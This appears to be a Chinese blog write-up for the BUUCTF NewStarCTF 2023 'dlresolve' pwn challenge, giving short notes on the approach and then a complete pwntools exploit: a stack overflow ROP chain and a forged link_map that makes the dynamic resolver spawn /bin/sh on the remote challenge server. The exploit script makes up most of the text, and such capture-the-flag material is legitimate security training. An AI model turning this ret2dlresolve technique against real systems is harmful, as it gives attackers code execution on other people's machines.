---
title: BUUCTF-NewStarCTF-2023-dlresolve 题解
date: 2026-02-09 16:54:00
tags: 
    - ret2dlresolve
    - 栈迁移
    - stack
    - pwn
    - BUUCTF
categories: BUUCTF 题解
---
### 题目

[题目链接](https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]dlresolve)

### 攻击思路

64 位下 ret2dlresolve 模板题

注意将返回地址覆盖为 plt 内容后可再接返回地址控制程序流程

注意 _dl_runtime_resolve 有点像 srop 会还原寄存器

### exp

```python
from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

debug = 0

if debug:
	io = process('./pwn_patched')
else:
	io = remote('node5.buuoj.cn', 28062)

link_map_base = 0x404800
binsh_addr = link_map_base + 0x28

read_plt = 0x401060
again_addr = 0x401192
plt0_addr = 0x401026
read_got  = 0x404020
pop_rdi_ret = 0x40115E
pop_rsi_ret = 0x40116B

def fake_link_map_gen(fake_link_map_base, delta, func_got_addr, mstr):
	fake_link_map = b''
	fake_link_map += p64(delta, sign = 'signed')
	fake_link_map += p64(func_got_addr - 8)
	fake_link_map += p64(fake_link_map_base + 24)
	fake_link_map += p64(fake_link_map_base - delta)
	fake_link_map += p64(7)
	fake_link_map += mstr.encode()
	fake_link_map = fake_link_map.ljust(0x68, b'\x00')
	fake_link_map += p64(fake_link_map_base)
	fake_link_map += p64(fake_link_map_base)
	fake_link_map = fake_link_map.ljust(0xF8, b'\x00')
	fake_link_map += p64(fake_link_map_base + 8)
	return fake_link_map

def attack():
	payload = b'A' * (0x70 + 8) + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_ret) + p64(link_map_base) + p64(read_plt) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(plt0_addr) + p64(link_map_base) + p64(0)
	io.send(payload.ljust(0x100, b'\x00'))
	payload = fake_link_map_gen(link_map_base, 0x52290 - 0x10dfc0, read_got, '/bin/sh\x00')
	io.send(payload.ljust(0x100, b'\x00'))
	io.interactive()

attack()
```